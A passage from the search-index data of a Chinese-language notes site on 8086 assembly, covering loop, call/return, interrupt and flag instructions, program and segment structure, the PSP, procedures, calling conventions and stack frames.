\u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 0 \u5219\u8df3\u8f6c\u5230 dest</li> <li>\u6ce8\u610f\uff1adest \u662f\u7acb\u5373\u6570\uff0cloopnz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185</li> </ul> loopne <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aloopne dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u5faa\u73af</li> <li>\u6ce8\u610f\uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopnz</li> </ul>"},{"location":"cs/pl/asm/#_31","title":"\u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de\u6307\u4ee4","text":"<p>call \u7c7b\u4f3c jmp \u7684\u8fd1\u8df3\u8fdc\u8df3\u4e5f\u6709\u8fd1\u8fc7\u7a0b\u8c03\u7528\u548c\u8fdc\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u533a\u522b\u4e5f\u5728\u4e8e cs \u662f\u5426\u53d1\u751f\u53d8\u5316</p> call \u8fd1\u8c03\u7528 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acall dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u5165\u6808\u7136\u540e\u8df3\u8f6c\u5230 dest\uff0c\u5373 push ip, ip = dest</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58</li> </ul> retn <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aretn / ret / retn count / ret count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8fd1\u8fd4\u56de<ul> <li>retn / ret\uff1a\u4ece\u6808\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5341\u516d\u4f4d\u6570\u5230 ip\uff0c\u5373 pop ip</li> <li>retn count / ret count\uff1a\u5148 pop ip \u7136\u540e sp += count</li> </ul> </li> <li>\u6ce8\u610f\uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fd1\u8c03\u7528\u8fd4\u56de</li> </ul> call \u8fdc\u8c03\u7528 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acall dest</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1apush cs, push ip, cs:ip = dest</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740</li> </ul> retf <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aretf / retf count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8fdc\u8fd4\u56de\uff0cpop ip, pop cs\uff0c\u82e5\u6709 count \u5219 sp += count</li> <li>\u6ce8\u610f\uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fdc\u8c03\u7528\u8fd4\u56de</li> </ul>"},{"location":"cs/pl/asm/#_32","title":"\u4e2d\u65ad\u548c\u4e2d\u65ad\u8fd4\u56de\u6307\u4ee4","text":"<p>\u4e2d\u65ad\u6307\u4ee4\u4e00\u822c\u7528\u4e8e\u5411\u7cfb\u7edf\u63d0\u51fa\u4e2d\u65ad\u8bf7\u6c42\u5f97\u5230\u7cfb\u7edf\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u4f5c\u8c03\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u51fd\u6570</p> int <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aint n</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8c03\u7528 n \u53f7\u4e2d\u65ad\uff0c\u7b49\u6548\u7684\u64cd\u4f5c\u6709<ul> <li>pushf, push cs, push ip</li> <li>tf = 0, if = 0, ip = word ptr 0:[n*4], cs = word ptr 0:[n*4+2]</li> </ul> </li> <li>\u6ce8\u610f\uff1an \u4e3a\u7acb\u5373\u6570\uff0c\u79f0\u4e3a\u4e2d\u65ad\u53f7\uff0c\u5728\u8303\u56f4 [0, 0FFh] \u5185\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a</li> </ul> OF DF IF TF SF ZF AF PF CF into <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ainto</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6ea2\u51fa\u4e2d\u65ad\uff0c\u5982\u679c of == 1 \u5219\u8c03\u7528 4 \u53f7\u4e2d\u65ad\uff08int 4h\uff09\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a</li> </ul> OF DF IF TF SF ZF AF PF CF iret <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1airet</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4e2d\u65ad\u8fd4\u56de\uff0c\u7b49\u6548\u64cd\u4f5c\u6709 pop ip, pop cs, popf</li> <li>\u6ce8\u610f\uff1a\u4e00\u822c\u7528\u4e8e\u4ece int \u6216 into \u4ea7\u751f\u7684\u4e2d\u65ad\u4e2d\u8fd4\u56de\uff0c\u6807\u5fd7\u4f4d\u56de\u5230\u4e2d\u65ad\u524d\u7684\u72b6\u6001</li> </ul>"},{"location":"cs/pl/asm/#_33","title":"\u6742\u7c7b\u6307\u4ee4","text":"clc <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aclc</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6e05\u7a7a\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 0</li> </ul> OF DF IF TF SF ZF AF PF CF stc <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1astc</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8bbe\u7f6e\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 1</li> </ul> OF DF IF TF SF ZF AF PF CF cmc <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acmc</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8fdb\u4f4d\u4f4d\u6c42\u53cd\uff0c\u5373 cf = ~cf</li> </ul> OF DF IF TF SF ZF AF PF CF cld <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acld</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6e05\u7a7a\u65b9\u5411\u4f4d\uff0c\u5373 df = 0\uff08\u6b63\u65b9\u5411\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF std <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1astd</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8bbe\u7f6e\u65b9\u5411\u4f4d\uff0c\u5373 df = 1\uff08\u8d1f\u65b9\u5411\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF cli <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acli</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u7981\u6b62\u4e2d\u65ad\uff0c\u5373 if = 0</li> </ul> OF DF IF TF SF ZF AF PF CF sti <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asti</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5141\u8bb8\u4e2d\u65ad\uff0c\u5373 if = 1</li> </ul> OF DF IF TF SF ZF AF PF CF nop <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1anop</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u65e0\u64cd\u4f5c\uff0c\u673a\u5668\u7801 90h\uff0c\u5360\u7528\u4e00\u4e2a\u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u6d88\u8017\u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4e0d\u8fdb\u884c\u64cd\u4f5c</li> </ul> hlt <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ahlt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u505c\u6b62\u5904\u7406\u5668\u5de5\u4f5c\uff0c\u76f4\u5230\u7cfb\u7edf\u590d\u4f4d\u6216\u53d1\u9001\u975e\u5c4f\u853d\u4e2d\u65ad\u6216\u5916\u90e8\u4e2d\u65ad</li> </ul>"},{"location":"cs/pl/asm/#8086_2","title":"8086 \u6c47\u7f16\u7a0b\u5e8f\u7f16\u5199","text":""},{"location":"cs/pl/asm/#_34","title":"\u6c47\u7f16\u7a0b\u5e8f\u57fa\u672c\u7ed3\u6784","text":"<pre><code>data segment                            ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\nhey  db 'Hello,world!', 0Dh, 0Ah, '$'   ; \u4f2a\u6307\u4ee4\u8bed\u53e5\ndata ends                               ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\n\ncode segment                            ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\nassume cs:code, ds:data                 ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\nmain:                                   ; \u6307\u4ee4\u8bed\u53e5\n    mov ax, data                        ; ...\n    mov ds, ax\n    mov ah, 9\n    mov dx, offset hey\n    int 21h\n    mov ah, 4Ch\n    int 21h\ncode ends                               ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\nend main                                ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5\n</code></pre>"},{"location":"cs/pl/asm/#_35","title":"\u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528","text":""},{"location":"cs/pl/asm/#_36","title":"\u6bb5\u5b9a\u4e49","text":"<pre><code>&lt;segmentname&gt; segment [&lt;align&gt;] [&lt;combine&gt;] ['&lt;class&gt;']\n    &lt;statements&gt;\n&lt;segmentname&gt; ends\n</code></pre> <p>\u65b9\u62ec\u53f7\u4e2d\u53ef\u4ee5\u7701\u7565</p> <ul> <li>align\uff1a\u5bf9\u9f50\u65b9\u5f0f\uff0cbyte word dword para page\uff08para \u4e3a 16 \u5b57\u8282\uff0cpage \u4e3a 256 \u5b57\u8282\uff09\u7f3a\u7701\u4e3a para</li> <li>combine\uff1a\u5408\u5e76\u7c7b\u578b\uff0cpublic stack common memory at\uff0cpublic \u4e00\u822c\u7528\u4e8e\u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\uff0cstack \u7528\u4e8e\u5806\u6808\u6bb5<ul> <li>ss \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740\uff0csp \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u672b\u5c3e\u5b57\u8282\u504f\u79fb\u5730\u5740\u52a0 1</li> <li>\u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\u53ef\u4ee5\u7701\u7565 public\uff0c\u5806\u6808\u6bb5\u4e0d\u80fd\u7701\u7565 stack</li> </ul> </li> <li>'class'\uff1a\u7c7b\u522b\u540d</li> </ul> <p>\u6570\u636e\u6bb5\u5b9a\u4e49\u65f6\u521d\u59cb\u6570\u636e\u4f2a\u6307\u4ee4\u4e3a <code>\u53d8\u91cf\u540d\uff08\u6807\u53f7\u540d\uff09\u3001\u5927\u5c0f\u3001\u5185\u5bb9</code>\uff0c\u5927\u5c0f\u5373\u4e3a db dw dd \u7b49\u3002\u5982\u679c\u91cd\u590d\u53ef\u4ee5\u7528 <code>\u5927\u5c0f \u5185\u5bb9 dup(\u6b21\u6570)</code> \u7684\u5f62\u5f0f</p> <p>\u5806\u6808\u6bb5\u5b9a\u4e49\u4e00\u822c\u4f7f\u7528\uff1a <pre><code>stk segment stack\ndb 100h dup(0)\nstk ends\n</code></pre> \u5373\u5f00\u542f\u4e00\u4e2a 100h \u5927\u5c0f\u7684\u5806\u6808</p>"},{"location":"cs/pl/asm/#_37","title":"\u6bb5\u7684\u5047\u8bbe","text":"<p>assume \u7528\u6765\u5efa\u7acb\u6bb5\u5bc4\u5b58\u5668\u4e0e\u6bb5\u7684\u5173\u7cfb\uff0c\u5e2e\u52a9\u6c47\u7f16\u7f16\u8bd1\u7a0b\u5e8f\u8865\u5145\u6bb5\u5730\u5740</p> <p>\u4e00\u822c\u5199\u4e3a <code>assume cs:code ds:data ss:stk</code> \u7684\u5f62\u5f0f\uff0c\u8fd9\u6837\u89e3\u6790\u53d8\u91cf\u65f6\u5c31\u53ef\u4ee5\u81ea\u52a8\u586b\u5145\u6bb5\u5730\u5740\uff0c\u6bd4\u5982\u4f7f\u7528 <code>mov ah, [abc]</code> \u6765\u5f15\u7528 data \u6bb5\u4e2d\u53d8\u91cf abc\uff0cabc \u7684\u6bb5\u5730\u5740\u4e3a data\uff0c\u800c\u901a\u8fc7 assume \u77e5\u9053 data \u5c31\u662f ds\uff0c\u56e0\u6b64\u4f1a\u88ab\u89e3\u91ca\u4e3a <code>mov ah, ds:[...]</code></p> <p>\u867d\u7136 cs \u548c ss \u4f1a\u81ea\u52a8\u8d4b\u503c\u4e3a\u6bb5\u5730\u5740\uff0c\u4f46 ds \u548c es \u4e0d\u4f1a\uff0c\u9700\u8981\u5728\u4ee3\u7801\u6bb5\u91cc\u624b\u52a8\u4fee\u6539</p>"},{"location":"cs/pl/asm/#_38","title":"\u6bb5\u7684\u5f15\u7528","text":"<p>\u76f4\u63a5\u5199\u6bb5\u540d\u5c31\u662f\u6bb5\u5730\u5740\u3002\u4f7f\u7528 <code>seg \u53d8\u91cf\u540d</code> \u6216 <code>seg \u6807\u53f7\u540d</code> \u5373\u8868\u793a\u53d8\u91cf/\u6807\u53f7\u6240\u5728\u7684\u6bb5\u5730\u5740</p>"},{"location":"cs/pl/asm/#_39","title":"\u7a0b\u5e8f\u7684\u7ed3\u675f","text":""},{"location":"cs/pl/asm/#_40","title":"\u6e90\u7a0b\u5e8f\u7684\u7ed3\u675f","text":"<p>\u4f7f\u7528 end \u6307\u4ee4\u7ed3\u675f\uff0c\u683c\u5f0f\u4e3a <code>end \u6807\u53f7\u540d</code>\uff0c\u6307\u5b9a\u7a0b\u5e8f\u4ece\u6807\u53f7\u5904\u5f00\u59cb\u8fd0\u884c</p>"},{"location":"cs/pl/asm/#_41","title":"\u7a0b\u5e8f\u6bb5\u524d\u7f00","text":"<p>\u7a0b\u5e8f\u6bb5\u524d\u7f00\uff08Program Segment Prefix\uff0cPSP\uff09\u662f\u4e00\u6bb5\u957f\u5ea6\u4e3a 100h \u5b57\u8282\u7684\u5185\u5b58\u3002DOS \u5728\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u5148\u4e3a\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a PSP\uff0c\u7136\u540e DOS \u8bfb\u53d6\u6539\u7a0b\u5e8f\u5185\u5bb9\u88c5\u5165 PSP \u540e\u9762\u7684\u5185\u5b58\u4e2d\uff0c\u6700\u540e\u628a ds \u548c es \u8bbe\u7f6e\u4e3a PSP \u6bb5\u5730\u5740\uff0c\u628a ss \u548c sp \u8bbe\u7f6e\u4e3a\u5806\u6808\u6bb5\u6bb5\u5730\u5740\u548c\u5806\u6808\u6bb5\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5730\u5740\u52a0 1\uff0c\u518d\u628a cs \u8bbe\u7f6e\u4e3a\u4ee3\u7801\u6bb5\u6bb5\u5730\u5740\uff0cip \u8bbe\u7f6e\u4e3a\u6e90\u7a0b\u5e8f\u4e2d end \u6307\u5b9a\u6807\u53f7\u7684\u504f\u79fb\u5730\u5740\uff0c\u7136\u540e\u7a0b\u5e8f\u4ece cs:ip \u5f00\u59cb\u8fd0\u884c</p> <p>PSP \u91cc\u9762\u5b58\u653e\u4e86\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u6709\u5173\u7684\u91cd\u8981\u4fe1\u606f\uff0c\u6bd4\u5982\u547d\u4ee4\u884c\u53c2\u6570\u3001\u73af\u5883\u5757\u6bb5\u5730\u5740\u3001\u7236\u7a0b\u5e8f\u7684 PSP \u6bb5\u5730\u5740\u7b49</p>"},{"location":"cs/pl/asm/#_42","title":"\u7a0b\u5e8f\u7684\u7ec8\u6b62","text":"<p>\u901a\u5e38\u8c03\u7528 21h \u53f7\u4e2d\u65ad\u7684 4C \u53f7\u529f\u80fd\u7ec8\u6b62\uff0c\u5982\uff1a <pre><code>mov ah, 4Ch\nmov al, \u8fd4\u56de\u7801\nint 21h\n</code></pre></p>"},{"location":"cs/pl/asm/#_43","title":"\u6c47\u7f16\u7a0b\u5e8f\u8bed\u53e5","text":"<ul> <li>\u7a7a\u767d\u4e0d\u654f\u611f</li> <li>\u5e38\u6570\u53ef\u4ee5\u4f7f\u7528\u6574\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff08\u62c6\u4e3a\u5b57\u7b26\uff09</li> <li>\u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5e38\u6570\uff0c\u6709 + - * / mod shl shr not and or xor seg offset\uff0c\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u80fd\u51fa\u73b0\u5bc4\u5b58\u5668\u7b49\uff0c\u53ea\u80fd\u662f\u5e38\u6570</li> <li>\u53ef\u4ee5\u4f7f\u7528 eql \u548c = \u5b9a\u4e49\u7b26\u53f7\u5e38\u6570<ul> <li>= \u7684\u53f3\u4fa7\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49</li> <li>eql \u7684\u53f3\u4fa7\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u3001\u6c47\u7f16\u8bed\u53e5\uff08<code>dosint eql &lt;int 21h&gt;</code>\uff09\uff0c\u4f46\u4e0d\u80fd\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49</li> </ul> </li> <li>\u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u7684\u547d\u540d\uff1a\u53ef\u4ee5\u662f 52 \u4e2a\u5927\u5c0f\u5199\u5b57\u6bcd\u300110 \u4e2a\u6570\u5b57\u3001\u4ee5\u53ca @$?_\uff0c\u6570\u5b57\u4e0d\u80fd\u5f00\u5934\uff0c$ \u4e0e ? \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u7f16\u8bd1\u65f6\u52a0\u4e0a /ml \u533a\u5206\u5927\u5c0f\u5199\uff09</li> <li>\u6807\u53f7\u5b9a\u4e49<ul> <li><code>\u6807\u53f7\u540d:</code> \u5373\u53ef</li> <li>\u6216\u8005 <code>\u6807\u53f7\u540d label near|far|byte|word|dword</code><ul> <li>near far \u6807\u8bc6\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7</li> <li>byte word dword \u6807\u8bc6\u6807\u53f7\u4e3a\u53d8\u91cf</li> </ul> </li> </ul> </li> <li>\u53d8\u91cf\u7684\u5f15\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf\u540d\u6216\u8005 [\u53d8\u91cf\u540d]</li> <li>\u53ef\u4ee5\u4f7f\u7528 \u53d8\u91cf\u540d[\u504f\u79fb] \u6765\u7c7b\u4f3c\u6570\u7ec4\u5f15\u7528\u503c\uff0c\u4f46\u504f\u79fb\u8bb0\u5f97\u504f\u79fb 1 \u5c31\u662f\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u4e0d\u662f\u4e0b\u4e00\u4e2a\u5143\u7d20</li> </ul>"},{"location":"cs/pl/asm/#_44","title":"\u5b50\u7a0b\u5e8f\u8bbe\u8ba1","text":"<p>\u5b50\u7a0b\u5e8f\u53c8\u79f0\u8fc7\u7a0b\uff0c\u5373\u7c7b\u4f3c\u9ad8\u7ea7\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u8fc7 call \u8c03\u7528 ret \u8fd4\u56de\uff0c\u53ef\u4ee5\u8fd1\u8c03\u7528\u6216\u8fdc\u8c03\u7528\u3002\u8fc7\u7a0b\u7684\u5b9a\u4e49\uff1a <pre><code>&lt;name&gt; proc &lt;attribute&gt;\n    ...\n&lt;name&gt; endp\n</code></pre> \u5176\u4e2d attribute \u4e3a near \u6216 far\uff0cnear \u5b9a\u4e49\u8fd1\u8fc7\u7a0b\u4f9b\u8fd1\u8c03\u7528\uff0c\u53ea\u80fd\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u5185\u8d77\u4f5c\u7528\uff1bfar \u5b9a\u4e49\u8fdc\u8fc7\u7a0b\u4f9b\u8fdc\u8c03\u7528\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u6216\u4e0d\u540c\u4ee3\u7801\u6bb5\u5185\u4f7f\u7528</p> <p>\u5982\u679c\u8fbe\u5230\u51fd\u6570\u7684\u6548\u679c\u4e5f\u53ef\u4ee5\u4e0d\u5b9a\u4e49\u8fc7\u7a0b\uff0c\u53ea\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\uff0c\u7136\u540e\u4f7f\u7528 ret / retn \u8fd4\u56de</p> <p>\u8fc7\u7a0b\u4e2d\u8981\u4fdd\u62a4\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\u8981\u5728\u8fc7\u7a0b\u5f00\u5934 push \u5165\u5806\u6808\uff0c\u7ed3\u5c3e\u4ece\u5806\u6808 pop \u56de\u6765</p>"},{"location":"cs/pl/asm/#_45","title":"\u5806\u6808\u4f20\u9012\u53c2\u6570","text":"<p>\u4f7f\u7528\u5806\u6808\u4f20\u9012\u53c2\u6570\u6709\u4e09\u79cd\u6807\u51c6\u65b9\u5f0f</p>"},{"location":"cs/pl/asm/#__cdecl","title":"__cdecl \u65b9\u5f0f","text":"<p>c \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u5e76\u4e14\u7531\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 <pre><code>f:\n    push bp\n    mov bp, sp\n    ...\n    mov sp, bp\n    pop bp\n    ret\n\nmain:\n    ...\n    push a2         ; \u538b\u5165\u53c2\u6570\n    push a1\n    call f\n    add sp, 4       ; \u6e05\u7406\u5806\u6808\n</code></pre></p>"},{"location":"cs/pl/asm/#__pascal","title":"__pascal \u65b9\u5f0f","text":"<p>pascal \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u5de6\u5230\u53f3\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 <pre><code>f:\n    push bp\n    mov bp, sp\n    ...\n    mov sp, bp\n    pop bp\n    ret 4\n\nmain:\n    ...\n    push a1\n    push a2\n    call f\n</code></pre></p>"},{"location":"cs/pl/asm/#__stdcall","title":"__stdcall \u65b9\u6cd5","text":"<p>Windows API \u7684\u6807\u51c6\u65b9\u6cd5\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808</p>"},{"location":"cs/pl/asm/#_46","title":"\u52a8\u6001\u53d8\u91cf\u4e0e\u5806\u6808\u7ed3\u6784","text":"<p>\u6bd4\u5982 c \u8bed\u8a00\u7684\u89c4\u8303\uff0c\u5728\u51fd\u6570\u4e2d\u4f1a\u6709\u52a8\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53d8\u91cf\u4f1a\u5b58\u653e\u5728\u5806\u6808\u4e0a\u3002\u51fd\u6570\u5f00\u5934\u5148 push bp \u5b58\u4e0b\u524d\u5e27\u6307\u9488\uff0c\u7136\u540e mov bp, sp \u5c06 bp \u79fb\u52a8\u5230\u6808\u9876\u3002\u4e4b\u540e\u53ef\u4ee5 sub sp, ... \u6765\u5411\u4e0a\u79fb\u52a8 sp \u6307\u9488\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e3a\u51fd\u6570\u7559\u51fa\u5806\u6808\u4e0a\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\uff0c\u8fd9\u4e9b\u7a7a\u95f4\u88ab\u7528\u6765\u5b58\u653e\u5c40\u90e8\u53d8\u91cf\u3002\u6267\u884c\u8fc7 sub sp, ... \u540e\u7684\u5806\u6808\u7ed3\u6784\u5982\uff1a <pre><code>+-------------+\n|             |     &lt;- sp\n+-------------+     \\\n|             |      |\n+-------------+      |\n|             |      |\n+-------------+      |- \u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\n|             |      |\n+-------------+      |\n|             |      |\n+-------------+     /\n|      bp     |     &lt;- bp\n+-------------+\n| return addr |     &lt;- \u7531 call \u538b\u5165\n+-------------+\n|     arg0    |     &lt;- [bp+4]\n+-------------+\n|     arg1    |     &lt;- [bp+6]\n+-------------+\n|     ...     |\n+-------------+\n</code></pre> \u5982\u56fe\u5373\u4e3a\u901a\u8fc7 sub sp, 10 \u5f00\u8f9f\u4e86 10 \u4e2a\u5b57\u8282\u7684\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u6b64\u65f6\u518d\u8fdb\u884c push \u548c pop \u64cd\u4f5c\u65f6\u5219\u4f1a\u5411\u4e0a\u589e\u957f\u4e0d\u4f1a\u8986\u76d6\u8be5\u51fd\u6570\u7684\u7a7a\u95f4\u3002</p> <p>\u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u4e5f\u90fd\u901a\u8fc7 bp \u6765\u8bbf\u95ee\uff0c\u6bd4\u5982\u53c2\u6570\u4ece [bp+4] \u5f00\u59cb\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540e [bp+6] \u662f\u7b2c\u4e8c\u4e2a\uff0c\u2026\u2026\u3002\u5c40\u90e8\u53d8\u91cf\u90fd\u662f\u901a\u8fc7 [bp-...] \u6765\u8fdb\u884c\u8bbf\u95ee\u7684</p> <p>\u8fd9\u6837\u7684\u5e27\u6808\u7ed3\u6784\u5728\u51fd\u6570\u9000\u51fa\u65f6\u5148 mov sp, bp\uff0c\u6b64\u65f6 sp \u56de\u843d\u56de bp \u7684\u4f4d\u7f6e\uff0c\u5c40\u90e8\u53d8\u91cf\u5168\u90e8\u5931\u6548\uff0c\u7136\u540e pop bp \u53d6\u51fa\u524d\u5e27\u6307\u9488\uff0c\u518d ret\uff0c\u6b64\u65f6 pop \u51fa\u8fd4\u56de\u5730\u5740\u8fd4\u56de\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u5904\u60c5\u51b5\u5806\u6808\u4e2d\u7684\u53c2\u6570</p> <p>C \u8bed\u8a00\u7684\u51fd\u6570\u91cc bp \u4e0d\u8981\u88ab\u66f4\u6539\uff0c\u540c\u6837\u4e5f\u9700\u8981\u4fdd\u62a4 bx si di \u7684\u503c\uff0c\u4f7f\u5176\u5728\u8c03\u7528\u51fd\u6570\u524d\u540e\u4e0d\u53d8\uff0c\u4e14\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7531 ax \u63d0\u4f9b\uff0c\u6240\u4ee5\u4e00\u822c\u7684\u51fd\u6570\u5199\u6cd5\u5c31\u662f\uff1a <pre><code>f:\n    push bp\n    mov bp, sp\n    sub sp, ...\n    push bx\n    push si\n    push di\n    ...             ; [bp+?] \u4e3a\u53c2\u6570\n    ...             ; [bp-?] \u4e3a\u5c40\u90e8\u53d8\u91cf\n    mov ax, ...     ; \u8bbe\u7f6e\u8fd4\u56de\u503c\n    pop di\n    pop si\n    pop bx\n    mov sp, bp\n    pop bp\n    ret\n</code></pre> \u8fd9\u79cd\u5199\u6cd5\u4e0b\u5e27\u6808\u7ed3\u6784\u548c\u5bc4\u5b58\u5668\u90fd\u4e0d\u4f1a\u4e71\u6389\uff0c\u5373\u4f7f\u662f\u8fdb\u884c\u9012\u5f52\u4e5f\u6ca1\u6709\u95ee\u9898</p>"},{"location":"cs/pl/asm/#_47","title":"\u4e2d\u65ad","text":"<p>\u4e2d\u65ad\u662f\u5728 CPU 